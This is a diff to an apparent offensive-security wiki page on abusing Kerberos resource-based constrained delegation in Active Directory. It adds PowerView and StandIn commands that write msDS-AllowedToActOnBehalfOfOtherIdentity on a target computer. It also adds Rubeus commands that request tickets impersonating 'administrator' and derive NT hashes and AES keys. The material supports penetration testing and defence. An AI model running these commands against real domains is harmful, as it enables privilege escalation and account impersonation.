@@ -92,7 +92,7 @@ Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'controlledaccountwithSPN'
 ```
 
-PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute ([source](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html?highlight=genericall#id31)).
+PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute ([source](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/)).
 
 ```bash
 # Obtain the SID of the controlled account with SPN (e.g. Computer account)
@@ -107,22 +107,37 @@ $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
-**2 - Obtain a ticket (delegation operation)** :ticket: ****&#x20;
-
-[Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the TGT and "impersonation ST" and inject it for later use.
+FuzzSecurity's [StandIn](https://github.com/FuzzySecurity/StandIn) project is another alternative in C# (.NET assembly) to edit the attribute ([source](https://github.com/FuzzySecurity/StandIn#add-msds-allowedtoactonbehalfofotheridentity)).
 
 ```powershell
-# Request the TGT
-Rubeus.exe tgtdeleg /nowrap
+# Obtain the SID of the controlled account with SPN (e.g. Computer account)
+StandIn.exe --object samaccountname=controlledaccountwithSPNName
 
-# Request the "impersonation" service ticke
-Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
+# Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer
+StandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID"
 ```
 
-The NT hash can be computed as follows.
+**2 - Obtain a ticket (delegation operation)** :ticket: ****&#x20;
 
-```bash
+[Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the TGT and "impersonation ST", and inject it for later use.
+
+```powershell
+# Request a TGT for the current user
+Rubeus.exe tgtdeleg /nowrap
+# OR - Request a TGT for a specific account
+Rubeus.exe asktgt /user:"controlledaccountwithSPN" /aes256:$aesKey /nowrap
+
+# Request the "impersonation" service ticket using RC4 Key
+Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
+# OR - Request the "impersonation" service ticket using TGT Ticket of the controlledaccountwithSPN
+Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"host/target" /altservice:cifs,ldap /domain:"domain" /user:"controlledaccountwithSPN" /ticket:$kirbiB64tgt
+```
+
+The NT hash and AES keys can be computed as follows.
+
+```powershell
 Rubeus.exe hash /password:$password
+Rubeus.exe hash /user:$username /domain:"domain.local" /password:$password
 ```
 
 {% hint style="warning" %}
